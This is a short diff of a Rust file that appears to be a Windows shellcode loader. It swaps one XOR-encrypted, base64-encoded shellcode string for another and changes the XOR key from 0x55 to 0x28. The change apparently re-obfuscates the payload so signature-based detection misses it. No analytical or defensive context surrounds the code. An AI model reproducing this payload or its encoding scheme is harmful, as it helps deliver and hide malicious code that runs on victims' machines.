@@ -12,8 +12,8 @@ use base64::Engine;
 use std::os::windows::process::CommandExt;
 use rand::Rng;
 
-const ENCRYPTED_SHELLCODE: &str = "qb3aVVVVNWSH3LAx3gdl3gdZ3gdB3id9WuIfc2SqZJX5aTQpV3l1lJpYVJIcILoHAt4HRd4XaVSF3hUt0JUhGVSF3g11Bd4dTVSG0JwhaRxkqt5h3lSDZJWUmlj5VJJttSChViitbihxILUN3g1xVIYz3lke3g1JVIbeUd5UhdwRcXEODjQMDwSqtQ0KD95HvNWqqqoIPWZnVVU9IiZnCgE9GSJzUty9qoXtxVRVVXyRAQU9fNU+VaqAP189lf1UMT1XVUQJ3LMFBQUFFQUVBT2/Woq1qoDCP0UDAj3M8CE0qoDQlSFfqhtdILm9MlVVVT9VP1EDAj1XjJ0KqoDWrVUrY95jPxU9VUVVVQM/VT0N8QawqoDGBj9VAwYCPVeMnQqqgNatVSh9DT1VFVVVP1UFPV56WmWqgAI9IDsYNKqACwuqWXFa0CWqqqq8zqqqqlSWfJMglJbupeD3Az9VBqqA";
-const KEY: u8 = 0x55;
+const ENCRYPTED_SHELLCODE: &str = "1MCnKCgoSBn6oc1Mo3oYo3oko3o8o1oAGdcnn2IOGeiEFElUKgQI6eclKe9hXcd6o3o4o2oUfyn4o2hQrehcZCn4o3AIeKNgMCn7reFcFBnXYaMcoyn+Gejp5yWEKe8QyF3cK1XQE1UMXchwo3AMKftOoyRjo3A0KfujLKMp+KFsDAxzc0lxcnnXyHB3cqM6wajX19d1QBsaKChAX1sad3xAZF8OL6HA1/iQuCkoKAHsfHhAAahDKNf9QiJA6IAiKkAqKDe4oc54eHh4aHhoeEDCJ/fI1/2/Qjh+f0CxjVxJ1/2t6Fwi12YgXcTATygoKEIoQix+f0Aq8eB31/2r0ChWHqMeQmhAKDgoKH5CKEBwjHvN1/27e0Iofnt/QCrx4HfX/avQKFUAcEAoaCgoQih4QCMHJxjX/X9AXUZlSdf9dnbXJAwnrVjX19fBs9fX1ynrAe5d6euT2J2KfkIoe9f9";
+const KEY: u8 = 0x28;
 
 fn encrypt_string(s: &str, key: u8) -> Vec<u8> {
     s.bytes().map(|b| b ^ key).collect()
